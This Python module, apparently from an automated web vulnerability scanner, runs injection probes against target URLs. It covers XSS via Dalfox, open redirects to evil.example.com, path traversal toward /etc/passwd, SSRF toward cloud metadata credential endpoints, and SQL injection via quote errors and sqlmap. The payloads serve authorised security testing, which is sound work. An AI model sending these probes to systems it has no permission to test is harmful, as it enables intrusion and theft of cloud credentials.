"""Phase: injections - XSS, SQLi, LFI, redirect, SSRF probes."""
from __future__ import annotations
import re
from urllib.parse import urlparse, parse_qs, urljoin

try:
    import requests
except ImportError:
    requests = None


def run(ctx):
    if not ctx.profile.get("send_payloads", False):
        ctx.log("INFO", "injections", "profile disallows payloads - skipping")
        return
    urls_file = ctx.output / "recon" / "urls.txt"
    urls = ctx.runner.read_lines(urls_file) if urls_file.exists() else []
    pu = [u for u in urls if "?" in u and "=" in u]
    ctx.log("INFO", "injections", f"{len(pu)} URLs with params")
    if not pu:
        return
    _xss(ctx, pu)
    _open_redirect(ctx, pu)
    _lfi(ctx, pu)
    _ssrf(ctx, pu)
    _sqli(ctx, pu)


def _xss(ctx, urls):
    """Dalfox v2.13.0 contract; headless omissions and crashes remain explicit."""
    import json
    import math
    import time

    mode = "enabled"
    ledger = getattr(ctx.runner, "execution_ledger", None)
    def note(status, reason, **fields):
        if ledger is not None:
            ledger.record(kind="adapter", tool="dalfox", status=status,
                          reason=reason, adapter="tbhm-v427-dalfox-213-adapter-1",
                          **fields)
    if not ctx.runner.has("dalfox"):
        ctx.log("WARN", "injections", "dalfox not installed; XSS scan unavailable")
        note("missing-required-tool", "dalfox not installed")
        return
    if not urls:
        return

    rc, version_out, version_err = ctx.runner.run(
        ["dalfox", "version"], timeout=10, log_name="dalfox_version",
        capture_mode="tail")
    if rc != 0 or not re.search(r"(?<![\w.])v?2\.13\.0(?![\w.])",
                               version_out + "\n" + version_err):
        ctx.log("WARN", "injections", "Dalfox adapter requires v2.13.0; no scan started")
        note("blocked", "unsupported or unreadable Dalfox version", returncode=rc)
        return
    rc, help_out, help_err = ctx.runner.run(
        ["dalfox", "file", "--help"], timeout=10, log_name="dalfox_help",
        capture_mode="tail")
    required = ["--worker", "--delay", "--timeout", "--no-color", "--silence"]
    if mode == "skip":
        required.append("--skip-headless")
    help_text = help_out + "\n" + help_err
    missing = [flag for flag in required
               if not re.search(re.escape(flag) + r"(?=\s|=|,|$)", help_text)]
    if rc != 0 or missing:
        ctx.log("WARN", "injections", "Dalfox CLI contract not met; no scan started")
        note("blocked", "Dalfox help contract failed", missing_flags=missing,
             returncode=rc)
        return

    rates = [1.0]
    for key in ("global_rps", "per_target_rps", "per_endpoint_rps"):
        value = (ctx.profile.get("rate_limit", {}) or {}).get(key)
        if value is None:
            continue
        try:
            value = float(value)
        except (TypeError, ValueError):
            value = float("nan")
        if not math.isfinite(value) or value <= 0:
            note("blocked", "invalid or disabled Dalfox rate allowance")
            ctx.log("WARN", "injections", "Dalfox rate allowance invalid; no scan started")
            return
        rates.append(value)
    if min(rates) < (1.0 / 60.0):
        note("blocked", "Dalfox delay contract cannot represent this low request allowance")
        ctx.log("WARN", "injections", "Dalfox rate requires a reviewed traffic broker")
        return
    delay_ms = max(1000, math.ceil(1000.0 / min(rates)))
    in_file = ctx.output / "scans" / "_xss_in.txt"
    out_file = ctx.output / "scans" / "dalfox.txt"
    summary_file = ctx.output / "scans" / "dalfox_adapter.json"
    in_file.parent.mkdir(exist_ok=True)
    ctx.runner.write_lines(in_file, urls[:500])
    if out_file.exists():
        # Preserve previous results; a successful empty retry must not read them.
        out_file.replace(out_file.with_name(
            "dalfox.before-" + str(time.time_ns()) + ".txt"))
    command = ["dalfox", "file", str(in_file), "--silence", "--no-color",
               "--worker", "1", "--delay", str(delay_ms), "--timeout", "10",
               "-o", str(out_file)]
    if mode == "skip":
        command.append("--skip-headless")
        note("partial", "headless DOM XSS and in-JS verification explicitly not executed")
    ctx.log("INFO", "injections",
            "dalfox: workers=1 delay_ms=" + str(delay_ms) + " headless=" + mode)
    rc, stdout, stderr = ctx.runner.run(
        command, timeout=1800, log_name="dalfox", capture_mode="tail")
    panic = "panic:" in (stdout + "\n" + stderr)
    summary = {
        "schema": "tbhm.dalfox-adapter/1",
        "adapter": "tbhm-v427-dalfox-213-adapter-1",
        "tool_version": "2.13.0", "workers": 1, "delay_ms": delay_ms,
        "request_timeout_seconds": 10, "returncode": rc,
        "headless_mode": mode, "headless_requested": mode == "enabled",
        "headless_execution_proven": False, "panic_observed": panic,
        "status": "complete" if rc == 0 and not panic and out_file.exists() else "incomplete",
        "security_coverage_complete": False,
        "native_delay_is_not_a_verified_aggregate_traffic_limit": True,
        "source_input_cap": 500,
        "output_present": out_file.exists(),
        "partial_output_retained": out_file.exists() and (rc != 0 or panic),
        "automatic_retries": 0,
    }
    summary_file.write_text(json.dumps(summary, indent=2) + "\n")
    if rc != 0 or panic:
        category = "browser_or_scanner_panic" if panic else (
            "timeout" if rc == 124 else "cancelled" if rc == 130 else "tool_error")
        note("partial", "Dalfox scan incomplete; partial output retained without promotion",
             returncode=rc, error_category=category)
        ctx.log("WARN", "injections",
                "Dalfox incomplete (" + category + "); see logs/dalfox.log")
        return
    if not out_file.exists():
        note("parser-error", "Dalfox returned success without the expected output artifact")
        ctx.log("WARN", "injections", "Dalfox output artifact missing; result inconclusive")
        return
    n = 0
    for line in out_file.read_text(errors="replace").splitlines():
        if "[POC]" in line or "[VULN]" in line:
            ctx.save_finding({
                "phase": "injections", "severity": "HIGH", "confidence": "MEDIUM",
                "title": "Dalfox XSS candidate", "target": ctx.targets[0],
                "url": line.strip()[:500], "evidence": line[:500],
                "description": "Dalfox candidate; independent controlled validation required.",
                "impact": "Potential JavaScript execution in a victim browser if independently validated.",
                "remediation": "Review source context and apply context-specific output encoding.",
                "cwe": "CWE-79", "mrs_score": 85,
            })
            n += 1
    note("executed", "Dalfox output reviewed; candidates require independent validation",
         candidate_count=n, headless_mode=mode)
    ctx.log("OK", "injections", "dalfox: " + str(n) + " XSS candidate(s)")


def _redirect_host(location: str, base_url: str = "") -> str:
    """Return the lowercase host a browser would navigate to for a Location value.
    Handles absolute URLs and scheme-relative //host. Returns
    "" when the redirect stays same-origin (relative path, no host)."""
    if not location:
        return ""
    loc = location.strip()
    if loc.startswith("//"):
        loc = "http:" + loc            # scheme-relative -> attacker host is authority
    elif "://" not in loc:
        if not base_url:
            return ""  # A host-shaped relative path still has no authority.
        loc = urljoin(base_url, loc)
    try:
        return (urlparse(loc).hostname or "").lower()
    except Exception:
        return ""


def _redirect_verification(ctx, original_url, mutation_url, parameter, first_response, finding_id):
    """Prove the native redirect observation using captured controls and repeats."""
    if not finding_id or not hasattr(ctx, 'storage') or not hasattr(ctx, 'output'):
        return
    from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit
    from core.proof_contracts import capture_snapshot, SCHEMA
    from core.assertion_engine import evaluate, confirmation_fields
    test_id = 'web.open_redirect.v2'
    def capture(role, url, response):
        prepared = getattr(response, 'request', None)
        return capture_snapshot(ctx.output, test_id=test_id, vulnerability_class='open_redirect',
            role=role, actor_id='anonymous',
            request={'url': getattr(prepared, 'url', None) or url, 'method': 'GET',
                     'headers': dict(getattr(prepared, 'headers', {}) or {}), 'body': ''},
            response={'status': response.status_code, 'headers': dict(response.headers),
                      'body': str(getattr(response, 'text', '') or '')[:200000]})
    tx = ctx.storage.start_test_execution(test_id=test_id, phase='injections', target=mutation_url,
                                          operation='open redirect controls and repeat captures', test_version='2')
    try:
        parts = urlsplit(original_url)
        query = urlencode([(key, '/' if key == parameter else value) for key, value in parse_qsl(parts.query, keep_blank_values=True)])
        control_url = urlunsplit((parts.scheme, parts.netloc, parts.path, query, ''))
        baseline = requests.get(original_url, allow_redirects=False, timeout=10)
        control = requests.get(control_url, allow_redirects=False, timeout=10)
        repeats = [requests.get(mutation_url, allow_redirects=False, timeout=10) for _ in range(2)]
        location = first_response.headers.get('Location', '')
        assertion = {'schema': SCHEMA, 'test_id': test_id, 'vulnerability_class': 'open_redirect',
                     'redirect_host': 'evil.example.com',
                     'failure_conditions': [{'type': 'header_equals', 'source': 'mutation', 'name': 'location', 'value': location}],
                     'negative_control_conditions': [{'type': 'status_equals', 'source': 'negative_control', 'value': control.status_code}]}
        proof = {'schema': SCHEMA, 'captures': {
            'baseline': capture('baseline', original_url, baseline),
            'mutation': capture('mutation', mutation_url, first_response),
            'negative_control': capture('negative_control', control_url, control),
            'repeats': [capture('repeat', mutation_url, response) for response in repeats]}}
        result = evaluate(assertion, proof, evidence_root=ctx.output)
        aid = ctx.storage.record_validation_attempt(verifier='native-open-redirect-v2', result=result,
            assertion=assertion, proof=proof, finding_id=finding_id, test_execution_id=tx)
        fields = confirmation_fields(result, method='native redirect + captured controls + two repeats', validation_attempt_id=aid)
        ctx.storage.update_finding_verification(finding_id, fields)
        ctx.storage.complete_test_execution(tx, status='failed-security-control' if result['result'] == 'pass' else 'inconclusive',
                                            result_summary='; '.join(result.get('reasons', [])))
    except Exception as exc:
        ctx.storage.complete_test_execution(tx, status='inconclusive', error=str(exc))


def _open_redirect(ctx, urls):
    if not requests:
        return
    keys = {"url", "redirect", "next", "return", "returnurl", "back", "u",
            "redir", "destination", "to", "out"}
    test = "https://evil.example.com/"
    cands = []
    for u in urls:
        try:
            qs = parse_qs(urlparse(u).query)
            for k in qs:
                if k.lower() in keys:
                    cands.append((u, k)); break
        except Exception:
            continue
    if not cands:
        return
    ctx.log("INFO", "injections", f"testing {len(cands)} redirect candidates...")
    for url, param in cands[:50]:
        new = re.sub(rf"({re.escape(param)}=)[^&]*", lambda m: m.group(1) + test, url, count=1)
        try:
            r = requests.get(new, allow_redirects=False, timeout=10)
            loc = r.headers.get("Location", "")
            # Open redirect only if the Location HOST is attacker-controlled.
            # Substring-matching the payload flags path/query reflections as
            # false positives (e.g. /redirect?next=evil.example.com stays on-site).
            _host = _redirect_host(loc, getattr(r, "url", None) or new)
            if r.status_code in {301, 302, 303, 307, 308} and _host == "evil.example.com":
                finding_id = ctx.save_finding({
                    "phase": "injections", "severity": "MEDIUM", "confidence": "HIGH",
                    "title": "Open Redirect", "target": ctx.targets[0],
                    "url": new[:500], "method": "GET", "parameter": param, "payload": test,
                    "evidence": f"Location: {loc}",
                    "description": f"`{param}` performs unvalidated external redirect.",
                    "impact": "Phishing via trusted-domain redirect.",
                    "remediation": "Whitelist allowed destinations.",
                    "cwe": "CWE-601", "mrs_score": 90,
                })
                _redirect_verification(ctx, url, new, param, r, finding_id)
        except Exception:
            continue


def _lfi(ctx, urls):
    if not requests:
        return
    # Prefer SecLists LFI payloads when available
    from core import seclists
    payloads = []
    for wl_name in ("lfi_jhaddix", "lfi_linux"):
        wl = seclists.get(wl_name)
        if wl:
            payloads = [l.strip() for l in wl.read_text(errors="ignore").splitlines()
                        if l.strip() and not l.startswith("#")]
            ctx.log("INFO", "injections", f"LFI payloads from {wl.name} ({len(payloads)})")
            break
    if not payloads:
        payloads = ["../../../../etc/passwd", "..%2f..%2f..%2fetc%2fpasswd",
                    "....//....//etc/passwd", "/etc/passwd%00"]
    # Cap to first 30 payloads to keep scan times reasonable
    payloads = payloads[:30]
    ctx.log("INFO", "injections", f"testing LFI on first 30 URLs with {len(payloads)} payloads...")
    for url in urls[:30]:
        try:
            qs = parse_qs(urlparse(url).query)
        except Exception:
            continue
        for param in qs:
            for pl in payloads:
                new = re.sub(rf"({re.escape(param)}=)[^&]*", lambda m: m.group(1) + pl, url, count=1)
                try:
                    r = requests.get(new, timeout=10)
                    if "root:x:" in r.text or "root:!:" in r.text:
                        ctx.save_finding({
                            "phase": "injections", "severity": "HIGH", "confidence": "HIGH",
                            "title": "Local File Inclusion", "target": ctx.targets[0],
                            "url": new[:500], "method": "GET", "parameter": param, "payload": pl,
                            "evidence": "Response contains /etc/passwd content",
                            "description": "Endpoint reads filesystem from user input.",
                            "impact": "Read sensitive files; possible RCE via log poisoning.",
                            "remediation": "Reject path-traversal. Use whitelist.",
                            "cwe": "CWE-22", "mrs_score": 90,
                        })
                        return
                except Exception:
                    continue


def _ssrf(ctx, urls):
    if not requests:
        return
    keys = {"url", "uri", "fetch", "callback", "src", "image",
            "redirect", "host", "domain", "site", "endpoint"}
    cands = []
    for u in urls:
        try:
            qs = parse_qs(urlparse(u).query)
            for k in qs:
                if k.lower() in keys:
                    cands.append((u, k)); break
        except Exception:
            continue
    if not cands:
        return
    # Prefer SecLists SSRF payloads when available
    from core import seclists
    payloads = []
    for wl_name in ("ssrf_urls", "ssrf_burp"):
        wl = seclists.get(wl_name)
        if wl:
            payloads = [l.strip() for l in wl.read_text(errors="ignore").splitlines()
                        if l.strip() and not l.startswith("#")]
            ctx.log("INFO", "injections", f"SSRF payloads from {wl.name} ({len(payloads)})")
            break
    if not payloads:
        payloads = ["http://169.254.169.254/latest/meta-data/",
                    "http://metadata.google.internal/computeMetadata/v1/",
                    "http://127.0.0.1:80"]
    payloads = payloads[:15]
    ctx.log("INFO", "injections", f"testing {len(cands)} SSRF candidates with {len(payloads)} payloads...")
    for url, param in cands[:30]:
        for pl in payloads:
            new = re.sub(rf"({re.escape(param)}=)[^&]*", lambda m: m.group(1) + pl, url, count=1)
            try:
                r = requests.get(new, timeout=12)
                inds = ["ami-id", "iam/security-credentials",
                        "computeMetadata", "instance-identity"]
                if any(i in r.text for i in inds):
                    ctx.save_finding({
                        "phase": "injections", "severity": "CRITICAL", "confidence": "HIGH",
                        "title": "SSRF to cloud metadata", "target": ctx.targets[0],
                        "url": new[:500], "parameter": param, "payload": pl,
                        "evidence": "Cloud metadata indicators in response",
                        "description": "SSRF reaches internal cloud metadata service.",
                        "impact": "Steal cloud credentials, pivot internal.",
                        "remediation": "Block RFC1918 + 169.254/16. Validate URLs.",
                        "cwe": "CWE-918", "mrs_score": 80,
                    })
                    return
            except Exception:
                continue


def _sqli(ctx, urls):
    if not requests:
        return
    errors = ["you have an error in your sql syntax", "warning: mysql",
              "unclosed quotation mark", "quoted string not properly terminated",
              "ora-01756", "ora-00921", "psql: error", "sqlite_error"]
    cands_sqlmap = []
    ctx.log("INFO", "injections", "SQLi heuristic on first 50 URLs...")
    for url in urls[:50]:
        new = url + "'"
        try:
            r = requests.get(new, timeout=10)
            for err in errors:
                if err in r.text.lower():
                    cands_sqlmap.append(url)
                    ctx.save_finding({
                        "phase": "injections", "severity": "HIGH", "confidence": "MEDIUM",
                        "title": "Possible SQLi (error-based)", "target": ctx.targets[0],
                        "url": new[:500], "method": "GET", "payload": "'",
                        "evidence": f"DB error: '{err}'",
                        "description": "Single-quote returned DB error. Verify with sqlmap.",
                        "impact": "Possible data extraction, auth bypass, RCE.",
                        "remediation": "Use parameterized queries.",
                        "cwe": "CWE-89", "mrs_score": 80,
                    })
                    break
        except Exception:
            continue
    cfg = ctx.profile.get("sqlmap", {})
    if cfg.get("enabled") and ctx.runner.has("sqlmap") and cands_sqlmap:
        ctx.log("INFO", "injections", f"sqlmap on {len(cands_sqlmap)} candidates...")
        for url in cands_sqlmap[:5]:
            rc, out, _ = ctx.runner.run(
                ["sqlmap", "-u", url, "--batch", "--smart",
                 f"--level={cfg.get('level',2)}", f"--risk={cfg.get('risk',1)}",
                 "--time-sec=3", f"--timeout={cfg.get('max_time',60)}"],
                timeout=cfg.get("max_time", 60) + 30, log_name="sqlmap"
            )
            if "is vulnerable" in out.lower():
                ctx.save_finding({
                    "phase": "injections", "severity": "CRITICAL", "confidence": "HIGH",
                    "title": "SQL Injection (sqlmap-confirmed)",
                    "target": ctx.targets[0], "url": url[:500],
                    "evidence": "sqlmap confirmed exploitability",
                    "description": "sqlmap successfully confirmed SQL injection.",
                    "impact": "Full DB compromise possible.",
                    "remediation": "Use parameterized queries.",
                    "cwe": "CWE-89", "mrs_score": 75,
                })
